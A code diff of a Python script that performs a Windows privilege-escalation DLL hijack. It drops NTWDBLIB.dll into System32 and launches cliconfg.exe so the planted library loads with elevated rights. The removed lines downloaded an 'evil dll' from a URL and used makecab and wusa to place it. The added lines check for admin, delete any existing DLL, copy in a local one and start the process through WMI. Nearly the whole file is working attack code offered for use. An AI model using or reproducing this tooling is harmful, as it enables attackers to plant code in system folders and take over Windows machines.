@@ -1,61 +1,66 @@
 """
-Under development, untested code but should work.
-
-https://www.greyhathacker.net/?p=796
-
-Executable:
-C:\windows\System32\cliconfg.exe
-
-Loads:
-C:\Windows\System32\NTWDBLIB.dll
-	
-Checks if cliconfg.exe is present in \system32\ folder, if True
-continue by checking if the dll file exists. If false, continue
-by attempting to download the evil dll file to \system32\ folder
-if fail, we attempt to use makecab and wusa to copy our dll. After
-the copy is done, we execute the executable and enjoys the elevated
-access
+Works from: Windows 7
+Fixed in: Windows 8
 """
 import os
-import sys
-import requests
-import win32api
+import wmi
+import shutil
+import ctypes
 import win32con
+from colorama import init, Fore
+init(convert=True)
 
-def cliconfig_dll_hijack(url):
-	if (os.path.isfile(os.path.join("c:\windows\system32\cliconfg.exe")) == True):
-		if (os.path.isfile(os.path.join("c:\windows\system32\NTWDBLIB.dll")) == False):
+wmi = wmi.WMI()
+
+dll_name = "NTWDBLIB.dll"
+dll_drop = "c:\windows\system32"
+
+def successBox():
+	return (Fore.GREEN + '[+]' + Fore.RESET)
+
+def errorBox():
+	return (Fore.RED + '[-]' + Fore.RESET)
+
+def infoBox():
+	return (Fore.CYAN + '[!]' + Fore.RESET)	
+
+def warningBox():
+	return (Fore.YELLOW + '[!]' + Fore.RESET)
+
+def cliconfig_dll_hijack():
+	print " {} cliconfig_dll_hijack: Attempting to dll hijack sysprep process".format(infoBox())
+	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
+		print " {} cliconfig_dll_hijack: We are running as admin, we can proceed".format(infoBox())
+		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
 			try:
-				download = requests.get(url)
-				if (len(download.content) > 1):
-					with open(os.path.join("c:\windows\system32\NTWDBLIB.dll"),"wb") as dll:
-						dll.write(download.content)
-						dll.close()
-					if (os.path.isfile(os.path.join("c:\windows\system32\NTWDBLIB.dll")) == True):
-						try:
-							win32api.ShellExecute(0,None,"c:\windows\system32\cliconfg.exe",None,None,win32con.SW_SHOW)
-						except Exception as error:
-							return False
-					else:
-						try:
-							makecab = os.popen("makecab NTWDBLIB.dll NTWDBLIB.tmp")
-						except Exception as error:
-							return False	
-						try:
-							wusa = os.popen("wusa NTWDBLIB.tmp /extract:c:\windows\system32")
-						except Exception as error:
-							return False
-						try:
-							os.remove("NTWDBLIB.tmp")
-						except Exception as error:
-							return False	
-						try:
-							win32api.ShellExecute(0,None,"c:\windows\system32\cliconfg.exe",None,None,win32con.SW_SHOW)
-						except Exception as error:
-							return False
-				else:
-					return False
+				os.remove(os.path.join(dll_drop,dll_name))
+				print " {} cliconfig_dll_hijack: Successfully removed: {} from: {}".format(successBox(),dll_name,dll_drop)
 			except Exception as error:
+				print " {} cliconfig_dll_hijack: Unable to remove: {} from: {}".format(errorBox(),dll_name,dll_drop)
 				return False
+
+		try:
+			shutil.copy(dll_name,dll_drop)
+			print " {} cliconfig_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,dll_drop)
+		except shutil.Error as error:
+			print " {} cliconfig_dll_hijack: Unable to copy: {} - {}".format(errorBox(),dll_name,error)
+			return False
+		except IOError as error:
+			print " {} cliconfig_dll_hijack: Unable to copy: {} - {}".format(errorBox(),dll_name,error)
+			return False
+
+		print " {} cliconfig_dll_hijack: Attempting to create process".format(infoBox())
+		try:
+			result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(dll_drop,"cliconfg.exe")),
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+			if (result[1] == 0):
+				print " {} cliconfig_dll_hijack: Process started successfully".format(successBox())
+			else:
+				print " {} cliconfig_dll_hijack: Problem creating process".format(errorBox())
+		except Exception as error:
+			print " {} cliconfig_dll_hijack: Problem creating process: {}".format(errorBox(),error)
+			return False			
+			
 	else:
-		sys.exit()
+		print " {} cliconfig_dll_hijack: We are not admin, cannot proceed".format(errorBox())
+		return False			
